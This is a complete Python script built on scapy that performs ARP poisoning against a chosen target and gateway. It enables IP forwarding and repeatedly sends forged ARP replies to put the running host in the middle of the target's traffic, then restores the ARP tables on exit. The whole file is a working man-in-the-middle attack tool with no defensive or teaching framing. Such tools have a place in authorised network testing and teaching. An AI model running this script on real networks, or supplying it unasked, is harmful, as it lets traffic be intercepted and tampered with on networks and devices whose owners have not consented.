from scapy.all import *
import os
import signal
import sys
import threading
import time
import subprocess
import optparse

#arp poison parameters
verb = 0

def lineSep():
    print('-'*45)

def enable_ip_forwarding():
    cmd = 'echo 1 > /proc/sys/net/ipv4/ip_forward'
    subprocess.call(cmd, shell=True)

def disable_ip_forwarding():
    cmd = 'echo 0 > /proc/sys/net/ipv4/ip_forward'
    subprocess.call(cmd, shell=True)

def get_mac(ip):
    answered_list, unanswered_list = sr(ARP(op=1, hwdst='ff:ff:ff:ff:ff:ff', pdst=ip), retry=2, timeout=10, verbose=False)
    for sent,recieved in answered_list:
        return recieved[ARP].hwsrc
    return None

def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    try:
        sent_packets = 0
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            print('\rPackets sent [' + str(sent_packets) + ']'),
            sent_packets += 2
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print()

def verify_mac(mac):
    if mac == None:
        sys.exit(0)
    else:
        return
def get_args():
    parser = optparse.OptionParser()
    parser.add_option('-g', '--gateway', dest='gateway_ip', help='Enter IP address of default gateway')
    parser.add_option('-t', '--target', dest='target_ip', help='Enter IP address of target')
    parser.add_option('-i', '--interface', dest='interface', help='Enter name of network interface')
    (options, arguments) = parser.parse_args()
    return options.gateway_ip, options.target_ip, options.interface


def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    disable_ip_forwarding()

def main():
    print("[*] Starting script: arp_poison.py")
    gateway_ip, target_ip, interface = get_args()
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)
    verify_mac(gateway_mac)
    verify_mac(target_mac)

    print("[*] Enabling port forwarding")
    enable_ip_forwarding()

    print('Gateway IP: ' + str(gateway_ip))
    print('Gateway MAC: ' + str(gateway_mac))
    print('Target IP: ' + str(target_ip))
    print('Target MAC: ' + str(target_mac))
    lineSep()

    print('[+] ARP SPOOF IN PROGRESS...')
    arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)

    print('[+] Exiting program, restoring IP tables')
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    print('[+] ARP Tables Restored')
    print('[+] Disabling Port forwarding')
    disable_ip_forwarding()
    print('DONE')


main()